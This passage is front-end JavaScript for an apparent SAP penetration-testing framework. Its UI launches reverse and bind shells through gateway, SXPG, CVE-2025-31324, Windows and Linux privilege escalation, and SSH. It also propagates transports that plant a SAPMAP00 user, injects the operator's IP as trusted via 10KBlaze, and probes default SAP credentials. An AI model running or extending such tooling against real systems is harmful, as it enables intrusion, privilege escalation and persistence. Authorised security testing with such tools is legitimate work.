        h.status === 'error'   ? '#f85149' :
        h.status === 'skipped' ? '#8b949e' :
        h.status === 'running' ? '#d29922' : '#8b949e';
      const statusIcon =
        h.status === 'success' ? '✅' :
        h.status === 'error'   ? '❌' :
        h.status === 'skipped' ? '⏭️' :
        h.status === 'running' ? '⏳' : '·';
      const pathTag = h.path ? ' <span style="color:#8b949e">[' + escHtml(h.path) + ']</span>' : '';
      const ctrl    = h.is_controller ? ' <span style="color:#39d1c4">CTRL</span>' : '';
      const verifyTag = h.verified
        ? ' <span style="color:#3fb950">verified' + (h.pinned ? ' + pinned' : '') + '</span>'
        : '';
      return '<div style="padding:4px 6px;background:#0d1117;border:1px solid #21262d;border-radius:3px">'
        + '<span style="color:' + statusColor + ';font-weight:600">' + statusIcon + ' '
        + escHtml(h.target_sid) + '</span>' + ctrl + pathTag + verifyTag
        + '<div style="color:#8b949e;font-size:10px;margin-top:2px">'
        + escHtml(h.message || h.phase || '') + '</div>'
        + '</div>';
    }).join('');
  }

  if (p.phase === 'done' || p.phase === 'error') {
    _stopTMSPropPoll();
    document.getElementById('tms-prop-go').disabled = false;
    document.getElementById('tms-prop-go').textContent = 'Run again';
    _renderTMSPropResult(p.result || {});
    // Refresh state so newly-pinned SAPMAP00 creds show up on peers.
    try { startPolling && startPolling(); } catch(_) {}
  }
}

function _renderTMSPropResult(res) {
  const el = document.getElementById('tms-prop-result');
  el.style.display = '';
  const okCount = res.ok_count || 0;
  const total   = res.hop_count || 0;
  const color = res.ok ? '#3fb950' : (res.partial ? '#d29922' : '#f85149');
  const title = res.ok ? '✅ All hops succeeded'
    : (res.partial ? '⚠️ Partial success' : '❌ Failed');
  let html = '<div style="color:' + color + ';font-weight:600;margin-bottom:6px">'
    + title + ' — ' + okCount + '/' + total + ' target(s)</div>';
  if (res.trkorr) {
    html += '<div><b>Transport:</b> ' + escHtml(res.trkorr) + ' from '
      + escHtml(res.source_sid || '?') + '</div>';
  }
  if (res.path_mode) {
    html += '<div><b>Path mode:</b> ' + escHtml(res.path_mode) + '</div>';
  }
  if (res.error) {
    html += '<div style="color:#ffcccc;margin-top:6px">' + escHtml(res.error) + '</div>';
  }
  // Per-hop breakdown — surfaces RFC vs OS-exec errors separately so
  // the operator can tell "RFC forward broken by DDIC gap" from
  // "OS-exec couldn't reach target".
  for (const h of (res.hops || [])) {
    const hopColor = h.ok ? '#3fb950' : '#f85149';
    const mark = h.ok ? '✅' : '❌';
    html += '<div style="margin-top:10px;padding:8px;border:1px solid #30363d;border-radius:4px;background:#0d1117">';
    html += '<div style="color:' + hopColor + ';font-weight:600">'
      + mark + ' ' + escHtml(h.target_sid || '?')
      + ' <span style="opacity:0.7;font-weight:normal;font-size:11px">via '
      + escHtml(h.path || '?') + ', ' + (h.duration_s || '?') + 's</span></div>';
    if (h.rfc_error) {
      html += '<div style="margin-top:4px;font-size:11px;color:#8b949e">'
        + '<b style="color:#d29922">RFC path:</b> '
        + escHtml(h.rfc_error) + '</div>';
    }
    if (h.os_error) {
      html += '<div style="margin-top:4px;font-size:11px;color:#8b949e">'
        + '<b style="color:#d29922">OS-exec path:</b> '
        + escHtml(h.os_error) + '</div>';
    }
    // Manual-step callout when the failure signature matches the
    // "forward FM silently no-ops on this kernel" pattern (RETCODE=012
    // from CTS_API + trkorr not in target buffer + operator remedies
    // mentioned).  Give a green "here's how to unblock" box instead of
    // a red opaque error string.
    const rfc = (h.rfc_error || '').toLowerCase();
    const isTargetMismatch = rfc.indexOf("root cause: e070.tarsystem") >= 0;
    const isAddtobufferOk  = rfc.indexOf("addtobuffer succeeded") >= 0;
    const isAlreadyCompleted = rfc.indexOf("known kernel limitation") >= 0
                                || rfc.indexOf("already imported on a prior run") >= 0;
    const needsManual = !h.ok && (
      rfc.indexOf("retcode=012") >= 0 ||
      rfc.indexOf("not in") >= 0 && rfc.indexOf("tmsbuffer") >= 0 ||
      rfc.indexOf("stms_tp_forwards") >= 0 ||
      rfc.indexOf("da 300") >= 0 ||
      isTargetMismatch ||
      isAlreadyCompleted
    );
    if (needsManual) {
      const trkorr = res.trkorr || '?';
      const src    = res.source_sid || '?';
      const tgt    = h.target_sid || '?';
      html += '<div style="margin-top:8px;padding:8px 10px;background:#161b22;border-left:3px solid #d29922;font-size:11px">';
      if (isAlreadyCompleted) {
        // Transport already imported once (IMPFLG='2') but bundle
        // credential doesn't work — user creation inside XPRA
        // probably failed with warnings.  Kernel refuses re-import.
        html += '<b style="color:#d29922">⚠ Transport already imported on ' + escHtml(tgt) + ' — but the user wasn\'t created</b><br>';
        html += 'The transport <code>' + escHtml(trkorr) + '</code> was imported previously ';
        html += '(<code>IMPFLG=\'2\'</code>, <code>MAXRC=4</code> = tp warnings), ';
        html += 'but the bundle credential doesn\'t log on to <code>' + escHtml(tgt) + '</code>. ';
        html += 'The earlier import\'s XPRA report (the ABAP that creates <code>SAPMAP00</code>) probably failed silently.<br>';
        html += 'This kernel refuses to re-import an already-completed transport via RFC ';
        html += '(verified against <code>TMS_MGR_IMPORT</code>, <code>TMS_TP_IMPORT</code>, <code>tp import</code>, ';
        html += 'and <code>tp addtobuffer</code> — all silently no-op on <code>IMPFLG=\'2\'</code>).<br>';
        html += '<b>Remedies:</b><br>';
        html += '<b>(a)</b> <b style="color:#3fb950">RELEASE A FRESH TRANSPORT with a new trkorr</b> — ';
        html += 'SAPMAP handles fresh transports end-to-end (verified).  ';
        html += 'Rebuild the bundle transport with a new number and retry.<br>';
        html += '<b>(b)</b> STMS UI on <code>' + escHtml(src) + '</code>: <code>STMS_IMPORT</code> → ';
        html += 'select <code>' + escHtml(tgt) + '</code> → right-click <code>' + escHtml(trkorr) + '</code> → ';
        html += '<b>Import Request Again</b> → check "Options" tab → tick "Ignore Invalid Component Version" ';
        html += 'and "Import Again" → OK.  The STMS UI path bypasses the RFC re-import block by triggering ';
        html += 'a background job instead of an inline FM call.';
      } else if (isAddtobufferOk && isTargetMismatch) {
        // Best-case: addtobuffer worked, only the E070 target-system
        // mismatch is stopping CTS_API — one STMS click completes it.
        html += '<b style="color:#3fb950">✓ Transport already queued in ' + escHtml(tgt) + '\'s buffer</b><br>';
        html += 'SAPMAP successfully ran <code>tp addtobuffer</code> on <code>' + escHtml(src) + '</code>, ';
        html += 'so <code>' + escHtml(trkorr) + '</code> is now in <code>' + escHtml(tgt) + '</code>\'s TMSBUFFER. ';
        html += 'CTS_API refused to auto-import because the transport was released targeting a different ';
        html += 'system (see <code>E070.TARSYSTEM</code> in the error above), and CTS_API blocks cross-target imports. ';
        html += 'STMS UI\'s "Import Request" click accepts cross-target imports as a standard operator workflow.<br>';
        html += '<b>👉 One-click remedy on <code>' + escHtml(src) + '</code>:</b><br>';
        html += '&nbsp;&nbsp;Run transaction <code>STMS_IMPORT</code>, select <code>' + escHtml(tgt);
        html += '</code>, right-click <code>' + escHtml(trkorr) + '</code> → <b>Import Request</b> → confirm.<br>';
        html += 'Then re-run this modal — the post-import verify auto-pins SAPMAP00 on <code>' + escHtml(tgt) + '</code>.';
      } else if (isAddtobufferOk) {
        html += '<b style="color:#3fb950">✓ Transport queued in ' + escHtml(tgt) + '\'s buffer</b><br>';
        html += 'SAPMAP successfully ran <code>tp addtobuffer</code>. CTS_API_IMPORT declined for a non-'
              + 'target-mismatch reason (see error above).<br>';
        html += '<b>👉 One-click remedy on <code>' + escHtml(src) + '</code>:</b><br>';
        html += '&nbsp;&nbsp;<code>STMS_IMPORT</code> → <code>' + escHtml(tgt);
        html += '</code> → right-click <code>' + escHtml(trkorr) + '</code> → <b>Import Request</b>';
      } else {
        html += '<b style="color:#d29922">👉 Manual step needed on this kernel</b><br>';
        html += 'The <code>TMS_MGR_FORWARD_TR_REQUEST</code> FM silently no-ops on ';
        html += escHtml(src) + ' (likely missing DDIC nametab <code>STMS_TP_FORWARDS</code>), ';
        html += 'and the automatic <code>tp addtobuffer</code> fallback also failed. ';
        html += 'Two operator remedies:<br>';
        html += '<b>(a)</b> STMS UI on <code>' + escHtml(src) + '</code>:<br>';
        html += '&nbsp;&nbsp;Run transaction <code>STMS_IMPORT</code>, then ';
        html += 'select <code>' + escHtml(tgt) + '</code> → <code>Extras → ';
        html += 'Other Requests → Add → ' + escHtml(trkorr) + '</code><br>';
        html += '<b>(b)</b> Shell on <code>' + escHtml(src) + '</code>\'s host:<br>';
        html += '&nbsp;&nbsp;<code>tp addtobuffer ' + escHtml(trkorr) + ' ' + escHtml(tgt);
        html += ' pf=&lt;shared&gt;\\bin\\TP_DOMAIN_' + escHtml(src) + '.PFL</code><br>';
        html += 'Then re-run the propagation.';
      }
      html += '</div>';
    }
    html += '</div>';
  }
  el.innerHTML = html;
}

async function showShellModal(sid) {
  _shellSid = sid;
  const n = (mapState.nodes || {})[sid];
  document.getElementById('shell-sid').textContent = sid;

  // Reset window position to centered
  const win = document.getElementById('shell-window');
  win.style.top = '50%'; win.style.left = '50%';
  win.style.transform = 'translate(-50%, -50%)';
  win.style.width = '820px'; win.style.height = '520px';

  // Method availability
  const hasGw = n && n.gw_vulnerable;
  const hasCreated = n && (n.created_users || []).length > 0;
  const hasCve = n && n.cve_2025_31324_vulnerable;
  const sysTypeS = (n && n.system_type || '').toUpperCase();
  const isAbapS = sysTypeS.indexOf('ABAP') !== -1;
  const methodSel = document.getElementById('shell-method');
  // Rebuild options from scratch — SXPG is ABAP-only (requires SAP_ALL
  // dialog user), so it is physically absent on pure-Java stacks.
  methodSel.innerHTML = '';
  const addS = (v, label, disabled) => {
    const o = document.createElement('option');
    o.value = v; o.textContent = label; o.disabled = !!disabled;
    methodSel.appendChild(o);
  };
  addS('gateway', 'Gateway (unauthenticated)', !hasGw);
  if (isAbapS) addS('sxpg', 'SXPG (via SAP_ALL user)', !hasCreated);
  addS('cve_31324', 'CVE-2025-31324 (Java unauth)', !hasCve);
  // SYSTEM via Windows LPE — only meaningful for Windows targets +
  // a viable Windows LPE technique was reported by Check Windows LPE.
  const hasWinLpeS = n && (n.efspotato_vulnerable
                             || n.godpotato_vulnerable
                             || n.miniplasma_vulnerable);
  addS('winlpe_system',
       '🔥 NT AUTHORITY\\SYSTEM (via Windows LPE)',
       !hasWinLpeS);
  // root via Linux LPE — Linux mirror of winlpe_system.  Same
  // gating logic + auto-detach wrapping behaviour as Windows
  // (server-side: nohup + stdio detach + background subshell so
  // the python3 socket trick survives the wrapper script exit).
  const hasLinuxLpeS = n && (n.copyfail_vulnerable
                               || n.dirtyfrag_vulnerable
                               || n.peditcow_vulnerable);
  addS('linuxlpe_root',
       '🔥 root (via Linux LPE)',
       !hasLinuxLpeS);
  // SSH lateral movement
  const hasSshS = n && (n.ssh_access || []).length > 0;
  const sshAccS = hasSshS ? n.ssh_access[0] : null;
  addS('ssh',
       hasSshS ? `SSH (${sshAccS.username}@${sshAccS.target} via ${sshAccS.from_sid})`
               : 'SSH (no lateral access)',
       !hasSshS);
  methodSel.value = hasWinLpeS    ? 'winlpe_system'
                  : hasLinuxLpeS  ? 'linuxlpe_root'
                               : (hasCve ? 'cve_31324'
                                         : (hasGw ? 'gateway'
                                                  : (isAbapS && hasCreated ? 'sxpg'
                                                    : (hasSshS ? 'ssh' : 'gateway'))));

  let info = [];
  if (hasGw) info.push('Gateway: vulnerable');
  if (hasCreated && isAbapS) info.push('SXPG: user available');
  if (hasCve) info.push('CVE-2025-31324: vulnerable');
  if (hasWinLpeS) {
    const techS = n.efspotato_vulnerable ? 'EfsPotato'
                   : n.godpotato_vulnerable ? 'GodPotato'
                                              : 'MiniPlasma';
    info.push('Windows LPE: ' + techS + ' viable - shell will run as SYSTEM');
  }
  if (hasLinuxLpeS) {
    const linuxTechS = n.copyfail_vulnerable ? 'Copy Fail'
                        : n.peditcow_vulnerable ? 'pedit-COW'
                        : 'Dirty Frag';
    info.push('Linux LPE: ' + linuxTechS + ' viable - shell will run as root');
  }
  if (hasSshS) {
    info.push(`SSH: ${sshAccS.username}@${sshAccS.target} from ${sshAccS.from_sid}`);
  }
  document.getElementById('shell-info').textContent = info.join(' | ');

  // Auto-detect callback IP
  const host = n ? (n.ip || n.hostname) : '';
  const saprouter = n ? (n.saprouter || '') : '';
  document.getElementById('shell-ip').value = 'detecting...';
  const ipRes = await api('GET', `shell/detect_ip?target=${encodeURIComponent(host)}&saprouter=${encodeURIComponent(saprouter)}`);
  document.getElementById('shell-ip').value = ipRes.local_ip || '127.0.0.1';

  // Default to bind mode for SAProuter systems (reverse often blocked)
  const modeSel = document.getElementById('shell-mode');
  modeSel.value = saprouter ? 'bind' : 'reverse';
  shellModeChanged();

  // Payload preview
  const os = (n && n.os_type || '').toLowerCase();
  const isWin = os.includes('windows') || os.includes('nt');
  document.getElementById('shell-payload-preview').textContent =
    isWin ? 'Payload: PowerShell shell (Windows detected)'
          : 'Payload: Python3 socket shell (Linux detected)';

  // Reset UI state
  document.getElementById('shell-config').style.display = '';
  document.getElementById('shell-status-bar').style.display = 'none';
  document.getElementById('shell-terminal').style.display = 'none';
  document.getElementById('shell-terminal').textContent = '';
  document.getElementById('shell-input-bar').style.display = 'none';
  document.getElementById('shell-stop-btn').style.display = 'none';
  document.getElementById('shell-input').disabled = true;
  document.getElementById('shell-send-btn').disabled = true;

  document.getElementById('shell-modal').classList.add('visible');
}

function shellModeChanged() {
  const mode = document.getElementById('shell-mode').value;
  const ipRow = document.getElementById('shell-ip-row');
  if (mode === 'bind') {
    ipRow.style.display = 'none';  // No callback IP needed for bind
  } else {
    ipRow.style.display = '';
  }
}

function shellSetStatus(state, text) {
  const dot = document.getElementById('shell-status-dot');
  const txt = document.getElementById('shell-status-text');
  const colors = {waiting:'#d29922', connected:'#3fb950', disconnected:'#f85149', error:'#f85149'};
  dot.style.background = colors[state] || '#484f58';
  txt.textContent = text;
}

async function shellStart() {
  const sid = _shellSid;
  const method = document.getElementById('shell-method').value;
  const shellMode = document.getElementById('shell-mode').value;
  const localIp = document.getElementById('shell-ip').value.trim();
  const port = parseInt(document.getElementById('shell-port').value) || 4444;

  if (shellMode === 'reverse' && !localIp) { alert('Callback IP is required'); return; }

  const res = await api('POST', 'shell/start', {
    sid, method, shell_mode: shellMode, listen_port: port, local_ip: localIp
  });
  if (res.error) { alert(res.error); return; }

  // Switch to shell view
  document.getElementById('shell-config').style.display = 'none';
  document.getElementById('shell-status-bar').style.display = '';
  document.getElementById('shell-terminal').style.display = '';
  document.getElementById('shell-input-bar').style.display = 'flex';
  document.getElementById('shell-stop-btn').style.display = '';
  if (shellMode === 'bind') {
    shellSetStatus('waiting', `Sending bind shell payload — will connect to ${sid}:${port}...`);
    document.getElementById('shell-terminal').textContent =
      `[*] Bind shell payload sent to ${sid}\n[*] Waiting for bind shell to start, then connecting to port ${port}...\n`;
  } else {
    shellSetStatus('waiting', `Listening on 0.0.0.0:${port} — waiting for connection...`);
    document.getElementById('shell-terminal').textContent =
      `[*] Reverse shell listener started on port ${port}\n[*] Payload sent to ${sid} — waiting for callback...\n`;
  }

  // Start polling
  shellStartPolling();
}

function shellStartPolling() {
  if (_shellPollId) clearInterval(_shellPollId);
  _shellPollId = setInterval(async () => {
    // Poll status
    const st = await api('GET', 'shell/status');
    if (!st.active) {
      shellSetStatus('disconnected', 'Session ended');
      shellStopPolling();
      return;
    }
    if (st.status === 'connected') {
      if (document.getElementById('shell-input').disabled) {
        shellSetStatus('connected', `Connected from ${st.client_addr}`);
        const term = document.getElementById('shell-terminal');
        term.textContent += `[+] Connected to ${st.client_addr}\n`;
        term.scrollTop = term.scrollHeight;
        document.getElementById('shell-input').disabled = false;
        document.getElementById('shell-send-btn').disabled = false;
        document.getElementById('shell-input').focus();
      }
    } else if (st.status === 'error') {
      shellSetStatus('error', st.error || 'Error');
      shellStopPolling();
      return;
    } else if (st.status === 'disconnected') {
      shellSetStatus('disconnected', 'Shell disconnected');
      document.getElementById('shell-input').disabled = true;
      document.getElementById('shell-send-btn').disabled = true;
      shellStopPolling();
      return;
    } else if (st.status === 'waiting' && st.progress) {
      shellSetStatus('waiting', st.progress);
    }

    // Poll output
    const out = await api('GET', 'shell/output');
    if (out.output) {
      const term = document.getElementById('shell-terminal');
      term.textContent += out.output;
      term.scrollTop = term.scrollHeight;
    }
  }, 200);
}

function shellStopPolling() {
  if (_shellPollId) { clearInterval(_shellPollId); _shellPollId = null; }
}

async function shellSendInput() {
  const input = document.getElementById('shell-input');
  const text = input.value;
  if (!text) return;
  input.value = '';
  await api('POST', 'shell/input', { text });
}

async function shellStop() {
  shellStopPolling();
  await api('POST', 'shell/stop');
  shellSetStatus('disconnected', 'Stopped');
  document.getElementById('shell-input').disabled = true;
  document.getElementById('shell-send-btn').disabled = true;
  // Re-show config for potential restart
  document.getElementById('shell-config').style.display = '';
}

function shellClose() {
  shellStop();
  closeModal('shell-modal');
}

// --- Draggable/resizable window helper ---
function makeDraggableResizable(winId, barId, handleId) {
  const win = document.getElementById(winId);
  const bar = document.getElementById(barId);
  const handle = document.getElementById(handleId);
  let dragging = false, resizing = false, dx, dy, startW, startH, startX, startY;

  function snapToAbsolute() {
    const r = win.getBoundingClientRect();
    if (win.style.transform && win.style.transform !== 'none') {
      win.style.top = r.top + 'px';
      win.style.left = r.left + 'px';
      win.style.transform = 'none';
    }
    return r;
  }

  bar.addEventListener('mousedown', e => {
    if (e.target.closest('button,input,select')) return;
    dragging = true;
    const r = snapToAbsolute();
    dx = e.clientX - r.left;
    dy = e.clientY - r.top;
    e.preventDefault();
  });

  handle.addEventListener('mousedown', e => {
    resizing = true;
    const r = snapToAbsolute();
    startW = r.width; startH = r.height;
    startX = e.clientX; startY = e.clientY;
    e.preventDefault();
  });

  document.addEventListener('mousemove', e => {
    if (dragging) {
      win.style.left = Math.max(0, e.clientX - dx) + 'px';
      win.style.top = Math.max(0, e.clientY - dy) + 'px';
    } else if (resizing) {
      win.style.width = Math.max(400, startW + e.clientX - startX) + 'px';
      win.style.height = Math.max(300, startH + e.clientY - startY) + 'px';
    }
  });

  document.addEventListener('mouseup', () => { dragging = false; resizing = false; });
}
makeDraggableResizable('shell-window', 'shell-titlebar', 'shell-resize-handle');
makeDraggableResizable('jss-window', 'jss-titlebar', 'jss-resize-handle');
makeDraggableResizable('term-window', 'term-titlebar', 'term-resize-handle');
makeDraggableResizable('fb-window', 'fb-titlebar', 'fb-resize-handle');

// --- Global actions ---
async function propagateAll() {
  if (confirm('Auto-propagate from all pwned systems?'))
    await api('POST', 'actions/propagate_all');
  startPolling();
}
async function cleanupAll() {
  if (confirm('Delete ALL SAPMAP-created users across ALL systems?'))
    await api('POST', 'actions/cleanup_all');
  startPolling();
}
async function checkAllGateways() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  if (confirm(`Check RFC gateway vulnerability on all ${nodeCount} system(s) on the map?`))
    await api('POST', 'actions/check_all_gw');
  startPolling();
}
function scanAllVulns() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  document.getElementById('vulns-select-info').textContent =
    `Targeting ${nodeCount} system(s) on the map.`;
  document.getElementById('vsel-default-creds').checked = false;
  document.getElementById('vulns-select-modal').classList.add('visible');
}
function selectAllVulns(on) {
  ['vsel-gw', 'vsel-ms', 'vsel-cve-31324', 'vsel-cve-6287',
   'vsel-cve-22536', 'vsel-router-info', 'vsel-default-creds']
    .forEach(id => { document.getElementById(id).checked = on; });
}
async function runSelectedVulns() {
  const checks = {
    gw:            document.getElementById('vsel-gw').checked,
    ms:            document.getElementById('vsel-ms').checked,
    cve_31324:     document.getElementById('vsel-cve-31324').checked,
    cve_6287:      document.getElementById('vsel-cve-6287').checked,
    cve_22536:     document.getElementById('vsel-cve-22536').checked,
    router_info:   document.getElementById('vsel-router-info').checked,
    default_creds: document.getElementById('vsel-default-creds').checked,
  };
  if (!Object.values(checks).some(v => v)) {
    alert('Select at least one check.');
    return;
  }
  if (checks.default_creds &&
      !confirm('Default Credentials probes well-known SAP accounts (SAP*, DDIC, TMSADM, …) ' +
               'over DIAG.  Failed attempts may LOCK these accounts after the configured ' +
               'retry threshold (typically 3-5).\n\nProceed?')) {
    return;
  }
  closeModal('vulns-select-modal');
  await api('POST', 'actions/check_all_vulns', { checks });
  startPolling();
}
async function checkAllBetrusted() {
  const nodeCount = Object.keys(mapState.nodes || {}).length;
  if (nodeCount < 1) { alert('No systems on the map.'); return; }
  if (confirm(`Check 10KBlaze (MS betrusted) vulnerability on all ${nodeCount} systems?\n\n` +
              `This will:\n` +
              `1. Scan for unprotected MS internal ports (39XX)\n` +
              `2. On vulnerable systems, inject our IP as trusted\n\n` +
              `Systems with gw/reg_no_conn_info=0 will become exploitable.`))
    await api('POST', 'actions/check_all_betrusted', { attacker_ip: localIp });
  startPolling();
}
// Helpers for the new "Check All XX" map-ctx-menu entries.  Each
// mirrors checkAllGateways' shape: count eligible nodes, confirm
// with the operator, fire the matching backend endpoint, then start
// polling for results.
//
// Eligibility filter mirrors the per-node menu's gating rule:
//   * cve_31324 / cve_6287 — Java / double-stack only
//   * cve_22536           — any ABAP/Java/WD (HTTP-serving)
//   * router_info         — every non-SAProuter SAP node (the
//                            check probes whether the node leaks
//                            its own configured /H/router/H/.. path)
async function checkAllCve31324() {
  const nodes = Object.values(mapState.nodes || {});
  const eligible = nodes.filter(n =>
    ((n.system_type || '').toUpperCase().indexOf('JAVA') !== -1));
  if (eligible.length < 1) {
    alert('No Java / double-stack systems on the map - CVE-2025-31324 only affects AS Java VisualComposer.');
    return;
  }
  if (confirm(`Check CVE-2025-31324 (VisualComposer JSP unauth) on ${eligible.length} Java system(s)?`))
    await api('POST', 'actions/check_all_cve_31324');
  startPolling();
}
async function checkAllCve6287() {
  const nodes = Object.values(mapState.nodes || {});
  const eligible = nodes.filter(n =>
    ((n.system_type || '').toUpperCase().indexOf('JAVA') !== -1));
  if (eligible.length < 1) {
    alert('No Java / double-stack systems on the map - CVE-2020-6287 (RECON) only affects AS Java LM Configuration Wizard.');
    return;
  }
  if (confirm(`Check CVE-2020-6287 (RECON) on ${eligible.length} Java system(s)?\n\n` +
              `Probes /CTCWebService/CTCWebServiceBean unauth endpoint - read-only check, no admin user is created.`))
    await api('POST', 'actions/check_all_cve_6287');
  startPolling();
}
async function checkAllCve22536() {
  const nodes = Object.values(mapState.nodes || {});
  const eligible = nodes.filter(n => {
    const st = (n.system_type || '').toUpperCase();
    return st.indexOf('ABAP') !== -1
        || st.indexOf('JAVA') !== -1
        || st.indexOf('WEB_DISPATCHER') !== -1
        || !!n.is_web_dispatcher;
  });
  if (eligible.length < 1) {
    alert('No SAP HTTP-serving systems on the map - CVE-2022-22536 (ICMAD) affects ABAP / Java / Web Dispatcher.');
    return;
  }
  if (confirm(`Check CVE-2022-22536 (ICMAD HTTP smuggling) on ${eligible.length} system(s)?\n\n` +
              `Probes for the ICM Content-Length smuggling primitive - passive, no payload sent to internal apps.`))
    await api('POST', 'actions/check_all_cve_22536');
  startPolling();
}
async function checkAllRouterInfo() {
  // SAProuter Info Leak is a router-side vulnerability: we ask the
  // router for its ROUTER_ADM info packet (routtab + clients).
  // Iterating non-router nodes and probing them on :3299 produces
  // false-positive findings when SAP systems share a host with the
  // actual router (operator-reported on shared-host landscapes).
  // Eligible: nodes that ARE SAProuters (system_type or a port
  // tagged 'saprouter' in their instances).
  const nodes = Object.values(mapState.nodes || {});
  const eligible = nodes.filter(n => {
    const st = (n.system_type || '').toUpperCase();
    if (st.indexOf('SAPROUTER') !== -1) return true;
    return (n.instances || []).some(i =>
      Object.entries(i.ports || {}).some(([p, s]) => s === 'saprouter'));
  });
  if (eligible.length < 1) {
    alert('No SAProuter nodes on the map - the info-leak check probes routers, not SAP application servers.');
    return;
  }
  if (confirm(`Check SAProuter Info Leak on ${eligible.length} SAProuter node(s)?\n\n` +
              `Sends a ROUTER_ADM info request - the router responds with its routtab and connected clients list when the NIINFO ACL is unset.`))
    await api('POST', 'actions/check_all_router_info');
  startPolling();
}

async function checkAllSnc() {
  // Info-only posture probe — sends one SNC INIT_REQ per dispatcher /
  // router and records whether SNC is enabled, the QoP level, and
  // (DIAG only) snc/only_encrypted_gui enforcement.  No exploit, no
  // Finding, no state mutation outside node.snc_info.
  const nodes = Object.values(mapState.nodes || {});
  const eligible = nodes.filter(n => {
    if ((n.system_type || '').toUpperCase().indexOf('SAPROUTER') !== -1) return true;
    return (n.instances || []).some(i =>
      Object.entries(i.ports || {}).some(([p, s]) => s === 'dispatcher' || (p >= 3200 && p <= 3299)));
  });
  if (eligible.length < 1) {
    alert('No nodes with a dispatcher or SAProuter port to probe.');
    return;
  }
  if (confirm(`Check SNC posture on ${eligible.length} node(s)?\n\n` +
              `Sends one SNC INIT_REQ per node. Info only — no Finding is raised.`))
    await api('POST', 'actions/check_all_snc');
  startPolling();
}

// =========================================================================
// MITRE ATT&CK coverage modal
// =========================================================================

// Wire pointer-drag handlers onto a modal so the operator can move
// it by grabbing the `.modal-drag-handle` element inside it.  Idempotent
// via `_dragWired` — repeated calls are cheap.  Position is stored on
// the modal element itself (via top/left inline styles) so it survives
// close → reopen within the same page load; a fresh reload resets to
// the CSS default (top:6vh; left:2vw).
function makeModalDraggable(modalEl) {
  if (!modalEl || modalEl._dragWired) return;
  const handle = modalEl.querySelector('.modal-drag-handle');
  if (!handle) return;
  modalEl._dragWired = true;
  let dragging = false, sx = 0, sy = 0, sl = 0, st = 0;
  handle.addEventListener('mousedown', (e) => {
    // Ignore drags that start on a link/button/input inside the header.
    if (e.target.closest('a, button, input, select, textarea')) return;
    dragging = true;
    const rect = modalEl.getBoundingClientRect();
    sx = e.clientX; sy = e.clientY;
    sl = rect.left;  st = rect.top;
    // Force position:fixed geometry we can update (CSS already does
    // this via .modal-draggable, but a stale inline top/left from a
    // previous drag would otherwise carry over).
    modalEl.style.left = sl + 'px';
    modalEl.style.top  = st + 'px';
    modalEl.style.margin = '0';
    document.body.style.userSelect = 'none';
    e.preventDefault();
  });
  window.addEventListener('mousemove', (e) => {
    if (!dragging) return;
    const nl = sl + (e.clientX - sx);
    const nt = st + (e.clientY - sy);
    // Clamp so the drag handle stays inside the viewport.
    const margin = 20;
    const w = modalEl.offsetWidth, h = modalEl.offsetHeight;
    const maxL = window.innerWidth  - margin;
    const maxT = window.innerHeight - margin;
    const minL = margin - w;
    const minT = 0;   // never drag the header above the top
    modalEl.style.left = Math.min(maxL, Math.max(minL, nl)) + 'px';
    modalEl.style.top  = Math.min(maxT, Math.max(minT, nt)) + 'px';
  });
  window.addEventListener('mouseup', () => {
    if (!dragging) return;
    dragging = false;
    document.body.style.userSelect = '';
  });
}

async function showAttackCoverage() {
  document.getElementById('attack-modal').classList.add('visible');
  // Wire drag handlers once (idempotent) and re-enable on every open
  // so a prior close doesn't leave the modal off-screen.
  const modalEl = document.querySelector('#attack-modal .modal-draggable');
  if (modalEl) {
    makeModalDraggable(modalEl);
    // If a previous drag pushed the modal fully off-screen, snap it
    // back to a sane starting position on reopen.
    const r = modalEl.getBoundingClientRect();
    if (r.right < 40 || r.bottom < 40
        || r.left > window.innerWidth - 40
        || r.top  > window.innerHeight - 40) {
      modalEl.style.left = ''; modalEl.style.top = ''; modalEl.style.margin = '';
    }
  }
  const body = document.getElementById('attack-heatmap-body');
  body.innerHTML = '<div style="color:#8b949e;text-align:center;padding:30px">Loading…</div>';
  let grid;
  try {
    const r = await fetch('/api/attack/heatmap');
    grid = await r.json();
  } catch (e) {
    body.innerHTML = '<div style="color:#f85149;padding:20px">Failed to load heatmap: ' + escHtml(String(e)) + '</div>';
    return;
  }
  const subtitle = document.getElementById('attack-modal-subtitle');
  const t = grid.totals || {};
  subtitle.textContent = ' — ' + (t.techniques || 0) + ' technique' + ((t.techniques === 1) ? '' : 's')
    + ' across ' + (t.tactics || 0) + ' tactic' + ((t.tactics === 1) ? '' : 's')
    + ', ' + (t.findings || 0) + ' tagged finding' + ((t.findings === 1) ? '' : 's')
    + ' · ATT&CK ' + (grid.attack_version || '?');
  body.innerHTML = renderAttackHeatmap(grid);
}

function renderAttackHeatmap(grid) {
  const cols = (grid && grid.columns) || [];
  if (!cols.length) {
    return '<div style="color:#8b949e;padding:30px;text-align:center">No ATT&amp;CK-tagged findings yet. Run discovery + exploits to populate the matrix.</div>';
  }
  const out = ['<div class="attack-heatmap-grid">'];
  cols.forEach(col => {
    const cells = (col.cells || []).map(c => {
      const score = c.score || 0;
      const cls = 'attack-cell s' + score + (c.sub_of ? ' attack-cell-sub' : '');
      const tt = c.id + ' — ' + c.name
        + (c.sids && c.sids.length ? '\n\nObserved on: ' + c.sids.join(', ') : '')
        + (c.count ? '\n' + c.count + ' finding' + (c.count === 1 ? '' : 's') : '');
      const onclick = (c.sids && c.sids.length)
        ? ` onclick="filterMapToSids(${JSON.stringify(c.sids).replace(/"/g,'&quot;')});closeModal('attack-modal')"` : '';
      return `<span class="${cls}" title="${escHtml(tt)}"${onclick}>${escHtml(c.id)}</span>`;
    }).join('');
    out.push(`<div class="attack-heatmap-col"><h5>${escHtml(col.tactic_name)}</h5>${cells}</div>`);
  });
  out.push('</div>');
  return out.join('');
}

// Active ATT&CK highlights — SID set + the wall-clock expiry time.
// _reapplyAttackHighlights() re-emits the pulsing overlay on every
// updateMap() rerender while sidExpiresAt is still in the future,
// so the highlight survives the 1-2 Hz polling that rewrites the SVG.
const HIGHLIGHT_DURATION_MS = 4500;        // wall-clock visible time (~3.5 pulse cycles)
let _attackHighlight = { sids: new Set(), expiresAt: 0 };

function _attachAttackHighlight(el) {
  // Idempotent: skip if our overlay is already attached.
  if (el.querySelector('rect.attack-hl-overlay')) return;
  const rect = el.querySelector('rect');
  if (!rect) return;
